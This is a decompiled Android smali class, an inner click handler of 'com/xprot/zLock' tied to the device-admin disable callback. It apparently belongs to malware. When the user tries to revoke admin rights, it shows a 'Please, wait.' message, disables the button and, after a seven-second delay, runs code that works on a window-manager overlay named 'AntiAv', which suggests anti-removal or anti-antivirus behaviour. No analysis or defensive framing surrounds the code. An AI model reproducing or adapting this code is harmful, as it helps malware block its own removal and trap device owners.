.class Lcom/xprot/zLock$1;
.super Ljava/lang/Object;
.source "zLock.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xprot/zLock;->onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/xprot/zLock;

.field private final synthetic val$AntiAv:Landroid/view/View;

.field private final synthetic val$Promo:Landroid/widget/TextView;

.field private final synthetic val$Tmp:Landroid/widget/Button;

.field private final synthetic val$wm:Landroid/view/WindowManager;


# direct methods
.method constructor <init>(Lcom/xprot/zLock;Landroid/widget/TextView;Landroid/widget/Button;Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xprot/zLock$1;->this$0:Lcom/xprot/zLock;

    iput-object p2, p0, Lcom/xprot/zLock$1;->val$Promo:Landroid/widget/TextView;

    iput-object p3, p0, Lcom/xprot/zLock$1;->val$Tmp:Landroid/widget/Button;

    iput-object p4, p0, Lcom/xprot/zLock$1;->val$wm:Landroid/view/WindowManager;

    iput-object p5, p0, Lcom/xprot/zLock$1;->val$AntiAv:Landroid/view/View;

    .line 73
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 4
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 78
    iget-object v2, p0, Lcom/xprot/zLock$1;->val$Promo:Landroid/widget/TextView;

    const-string v3, "\n\n\n\n\nPlease, wait.\n\n\n\n\n"

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 79
    iget-object v2, p0, Lcom/xprot/zLock$1;->val$Tmp:Landroid/widget/Button;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setEnabled(Z)V

    .line 81
    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    .line 82
    .local v1, "RView":Landroid/os/Handler;
    new-instance v0, Lcom/xprot/zLock$1$1;

    iget-object v2, p0, Lcom/xprot/zLock$1;->val$wm:Landroid/view/WindowManager;

    iget-object v3, p0, Lcom/xprot/zLock$1;->val$AntiAv:Landroid/view/View;

    invoke-direct {v0, p0, v2, v3}, Lcom/xprot/zLock$1$1;-><init>(Lcom/xprot/zLock$1;Landroid/view/WindowManager;Landroid/view/View;)V

    .line 91
    .local v0, "RV":Ljava/lang/Runnable;
    const-wide/16 v2, 0x1b58

    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 93
    return-void
.end method
